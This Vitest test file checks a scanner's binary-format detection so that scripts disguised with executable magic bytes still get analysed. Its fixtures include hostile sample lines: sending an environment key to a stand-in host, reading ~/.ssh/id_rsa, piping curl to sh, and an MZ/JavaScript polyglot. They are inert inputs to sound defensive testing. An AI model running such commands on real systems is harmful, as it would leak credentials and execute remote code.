import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtemp, rm, writeFile, copyFile, readFile } from 'node:fs/promises';
import { existsSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir } from 'node:os';
import { binaryFileFormat, binaryFormat, isScriptFile, sourceText } from './binary-text.js';
import { LocalFSProvider } from '../core/local-fs-provider.js';

const hex = (s: string) => Buffer.from(s.replace(/ /g, ''), 'hex');

describe('sourceText', () => {
  it('keeps a script with a stray NUL, offsets intact', () => {
    const code = 'const k = process.env.KEY;\nfetch("https://x.example/?k=" + k);\n// \0\n';
    expect(sourceText(code)).toBe(code.replace('\0', ' '));
    expect(sourceText(code)).toHaveLength(code.length);
  });

  it('passes plain text through', () => {
    expect(sourceText('print("hi")\n')).toBe('print("hi")\n');
  });
});

describe('binaryFormat (raw bytes)', () => {
  it.each([
    ['ELF', '7f454c46 020101 00'],
    ['Mach-O 64 (cffaedfe)', 'cffaedfe 0c000001'],
    ['Mach-O 32 BE (feedface)', 'feedface 00000007'],
    ['fat (cafebabe)', 'cafebabe 00000002'],
    ['fat LE (bebafeca)', 'bebafeca 02000000'],
    ['zip', '504b0304 14000000'],
    ['gzip', '1f8b0800 00000000'],
    ['xz', 'fd377a585a00 0004'],
    ['wasm', '0061736d 01000000'],
  ])('recognises %s', (_name, h) => {
    expect(binaryFormat(hex(h))).toBeDefined();
  });

  it('needs a real PE header behind MZ (e_lfanew → PE\\0\\0)', () => {
    const pe = Buffer.alloc(0x100);
    pe.write('MZ', 0, 'latin1');
    pe.writeUInt32LE(0x80, 0x3c);
    pe.write('PE\0\0', 0x80, 'latin1');
    expect(binaryFormat(pe)).toBe('PE executable');
    expect(binaryFormat(Buffer.from('MZ=1//\0\nrequire("child_process").exec("id");\n'))).toBeUndefined();
  });

  it('does not take ELF magic with invalid class/data bytes for an executable', () => {
    expect(binaryFormat(Buffer.from('\x7fELF\nexec(x)\n', 'latin1'))).toBeUndefined();
  });
});

describe('binaryFileFormat (dt20 g7-F1, dt20r-g2-N1)', () => {
  let dir: string;
  const fs = new LocalFSProvider();
  beforeEach(async () => { dir = await mkdtemp(join(tmpdir(), 'vaso-bin-')); });
  afterEach(async () => { await rm(dir, { recursive: true, force: true }); });

  async function judge(name: string, bytes: Buffer): Promise<string | undefined> {
    const path = join(dir, name);
    await writeFile(path, bytes);
    return binaryFileFormat(fs, path, await readFile(path, 'utf-8'));
  }

  it('never calls a script binary: MZ polyglot JavaScript, junk-prefixed bash, NUL + non-UTF-8 bytes', async () => {
    expect(await judge('run.js', Buffer.from('MZ=1//\0\nrequire("fs").readFileSync(process.env.HOME + "/.ssh/id_rsa");\n'))).toBeUndefined();
    expect(await judge('run.sh', Buffer.concat([hex('ffffffff'), Buffer.from('\n\0\ncurl -s https://x.example.invalid | sh\n')]))).toBeUndefined();
    expect(await judge('a.js', Buffer.concat([Buffer.from('// '), Buffer.from([0, 0xff]), Buffer.from('\nexec(x);\n')]))).toBeUndefined();
    expect(await judge('b.js', Buffer.from(`// ${'\0'.repeat(80)}\nexec(x);\n`))).toBeUndefined();
    // extensionless but with a shebang
    expect(await judge('helper', Buffer.concat([Buffer.from('#!/bin/sh\n'), hex('cffaedfe0c000001')]))).toBeUndefined();
  });

  it('judges an extensionless file by its raw magic — the same junk prefix is not Mach-O', async () => {
    expect(await judge('helper', Buffer.concat([hex('ffffffff'), Buffer.from('\n\0\ncurl x | sh\n')]))).toBeUndefined();
    expect(await judge('helper2', Buffer.concat([hex('cffaedfe0c000001'), Buffer.alloc(64)]))).toBe('Mach-O executable');
  });

  it.skipIf(!existsSync('/usr/bin/true'))('skips a real executable, but analyses one copied under a script name', async () => {
    await copyFile('/usr/bin/true', join(dir, 'tool'));
    expect(await binaryFileFormat(fs, join(dir, 'tool'), await readFile(join(dir, 'tool'), 'utf-8'))).toMatch(/Mach-O|ELF/);
    await copyFile('/usr/bin/true', join(dir, 'tool.sh'));
    const text = await readFile(join(dir, 'tool.sh'), 'utf-8');
    expect(await binaryFileFormat(fs, join(dir, 'tool.sh'), text)).toBeUndefined();
    expect(sourceText(text)).toHaveLength(text.length);
  });

  it('falls back to ASCII-only signatures without raw bytes, never matching U+FFFD', async () => {
    const noHead = {};
    const decoded = Buffer.concat([hex('cffaedfe'), Buffer.alloc(16)]).toString('utf-8');
    expect(await binaryFileFormat(noHead, '/x/helper', decoded)).toBeUndefined();
    expect(await binaryFileFormat(noHead, '/x/helper', '\x7fELF\x02\x01\x01\0\0\0')).toBe('ELF executable');
  });
});

describe('isScriptFile', () => {
  it('goes by extension or shebang', () => {
    expect(isScriptFile('/s/run.PY', '')).toBe(true);
    expect(isScriptFile('/s/helper', '#!/usr/bin/env node\n')).toBe(true);
    expect(isScriptFile('/s/helper', '\x7fELF')).toBe(false);
  });
});
